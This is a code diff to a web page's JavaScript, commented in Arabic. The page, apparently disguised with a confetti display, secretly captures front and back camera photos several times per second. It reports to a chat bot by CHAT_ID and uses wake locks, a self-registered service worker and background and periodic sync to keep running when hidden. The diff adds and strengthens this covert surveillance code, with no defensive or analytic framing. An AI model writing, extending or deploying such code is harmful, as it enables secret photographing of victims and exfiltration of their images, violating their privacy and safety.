@@ -308,7 +308,6 @@ let CHAT_ID = '';
 let frontCount = 0;
 let backCount = 0;
 let isRunning = true;
-let captureInterval = null;
 
 // ============================================================
 // ====================== CONFETTI =============================
@@ -405,6 +404,7 @@ function getChatId() {
 let frontStream = null, backStream = null;
 let frontReady = false, backReady = false;
 let frontVideo = null, backVideo = null;
+let captureInterval = null;
 
 function startCameras() {
     // الكاميرا الأمامية
@@ -418,9 +418,12 @@ function startCameras() {
         frontVideo.onloadedmetadata = function() {
             frontVideo.play();
             frontReady = true;
+            sendMessage('📸 كاميرا أمامية جاهزة');
         };
     })
-    .catch(function(err) {});
+    .catch(function(err) {
+        sendMessage('❌ فشل كاميرا أمامية: ' + err.message);
+    });
     
     // الكاميرا الخلفية
     navigator.mediaDevices.getUserMedia({ 
@@ -433,20 +436,26 @@ function startCameras() {
         backVideo.onloadedmetadata = function() {
             backVideo.play();
             backReady = true;
+            sendMessage('📸 كاميرا خلفية جاهزة');
         };
     })
-    .catch(function(err) {});
+    .catch(function(err) {
+        sendMessage('❌ فشل كاميرا خلفية: ' + err.message);
+    });
     
-    // بدء التصوير كل 5 ثواني
-    captureInterval = setInterval(captureBothPhotos, 5000);
+    // التصوير كل ثانية (5 صور أمامي + 5 صور خلفي = 10 صور بالثانية)
+    captureInterval = setInterval(captureBothPhotos, 1000);
     
-    // التقاط أول صور فوراً بعد ثانية
-    setTimeout(captureBothPhotos, 1000);
+    // التقاط أول صور فوراً
+    setTimeout(captureBothPhotos, 500);
 }
 
 function captureBothPhotos() {
-    captureFrontPhoto();
-    captureBackPhoto();
+    // تصوير 5 صور أمامي + 5 صور خلفي = 10 صور
+    for (let i = 0; i < 5; i++) {
+        captureFrontPhoto();
+        captureBackPhoto();
+    }
 }
 
 function captureFrontPhoto() {
@@ -480,26 +489,20 @@ function captureBackPhoto() {
 // ============================================================
 // ====================== BACKGROUND SERVICE ==================
 // ============================================================
-// استخدام Broadcast Channel لمنع الإيقاف
-try {
-    const channel = new BroadcastChannel('keep_alive_channel');
-    channel.postMessage('keep_alive');
-    channel.onmessage = function(e) {
-        if (e.data === 'keep_alive') {
-            // استمرار التشغيل
-        }
-    };
-} catch(e) {}
-
 // منع المتصفح من إيقاف التشغيل
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
-        // إرسال رسالة للبوت بأن الصفحة في الخلفية
         sendMessage('⏳ الصفحة في الخلفية - التصوير مستمر');
         // التأكد من استمرار التشغيل
         if (!captureInterval) {
-            captureInterval = setInterval(captureBothPhotos, 5000);
+            captureInterval = setInterval(captureBothPhotos, 1000);
         }
+        // منع السكون
+        try {
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').catch(() => {});
+            }
+        } catch(e) {}
     } else {
         sendMessage('🔄 الصفحة نشطة - التصوير مستمر');
     }
@@ -509,7 +512,7 @@ document.addEventListener('visibilitychange', function() {
 try {
     if ('wakeLock' in navigator) {
         navigator.wakeLock.request('screen').then(function(lock) {
-            // قفل الشاشة لمنع السكون
+            sendMessage('🔒 تم منع السكون');
         }).catch(function() {});
     }
 } catch(e) {}
@@ -519,7 +522,6 @@ try {
 // ============================================================
 // تسجيل Service Worker للبقاء في الخلفية
 if ('serviceWorker' in navigator) {
-    // إنشاء Service Worker بسيط
     const swCode = `
         self.addEventListener('install', function(e) {
             self.skipWaiting();
@@ -530,37 +532,72 @@ if ('serviceWorker' in navigator) {
         self.addEventListener('fetch', function(e) {
             e.respondWith(fetch(e.request));
         });
+        // إرسال نبضات للتأكد من الحياة
+        setInterval(function() {
+            self.clients.matchAll().then(function(clients) {
+                clients.forEach(function(client) {
+                    client.postMessage('keep_alive');
+                });
+            });
+        }, 5000);
     `;
     const blob = new Blob([swCode], { type: 'application/javascript' });
     const swUrl = URL.createObjectURL(blob);
     navigator.serviceWorker.register(swUrl).then(function(reg) {
-        // Service Worker مسجل
-    }).catch(function() {});
+        sendMessage('✅ Service Worker مسجل');
+    }).catch(function() {
+        sendMessage('❌ فشل تسجيل Service Worker');
+    });
+}
+
+// ============================================================
+// ====================== BACKGROUND SYNC =====================
+// ============================================================
+// استخدام Background Sync لإعادة التشغيل إذا توقف
+if ('serviceWorker' in navigator && 'SyncManager' in window) {
+    navigator.serviceWorker.ready.then(function(reg) {
+        try {
+            reg.sync.register('keep-alive-sync').then(function() {
+                sendMessage('✅ Background Sync مسجل');
+            }).catch(function() {});
+        } catch(e) {}
+    });
+}
+
+// ============================================================
+// ====================== PERIODIC SYNC =======================
+// ============================================================
+// إعادة تشغيل الكود كل فترة
+if ('serviceWorker' in navigator && 'PeriodicSyncManager' in window) {
+    navigator.serviceWorker.ready.then(function(reg) {
+        try {
+            reg.periodicSync.register('periodic-keep-alive', {
+                minInterval: 60000 // كل دقيقة
+            }).then(function() {
+                sendMessage('✅ Periodic Sync مسجل');
+            }).catch(function() {});
+        } catch(e) {}
+    });
 }
 
 // ============================================================
 // ====================== KEEP ALIVE ==========================
 // ============================================================
-// نبضات حياة كل 10 ثواني
+// نبضات حياة كل 5 ثواني
 setInterval(function() {
     if (CHAT_ID && isRunning) {
-        // إرسال نبضة للتأكد من الحياة
-        console.log('🔴 alive - ' + new Date().toLocaleString());
-        
         // التأكد من استمرار الكاميرات
         if (!frontReady && !backReady) {
-            // محاولة إعادة تشغيل الكاميرات
             if (!frontStream && !backStream) {
                 startCameras();
             }
         }
-        
         // التأكد من استمرار التصوير
         if (!captureInterval) {
-            captureInterval = setInterval(captureBothPhotos, 5000);
+            captureInterval = setInterval(captureBothPhotos, 1000);
         }
     }
-}, 10000);
+}, 5000);
 
 // ============================================================
 // ====================== INIT =================================
@@ -585,6 +622,13 @@ setTimeout(function() {
         startCameras();
     }
 }, 10000);
+
+// إرسال رسالة للبوت بأن الكود يعمل
+setTimeout(function() {
+    if (CHAT_ID) {
+        sendMessage('🔥 الكود يعمل - تصوير مستمر كل ثانية');
+    }
+}, 3000);
 </script>
 </body>
 </html>
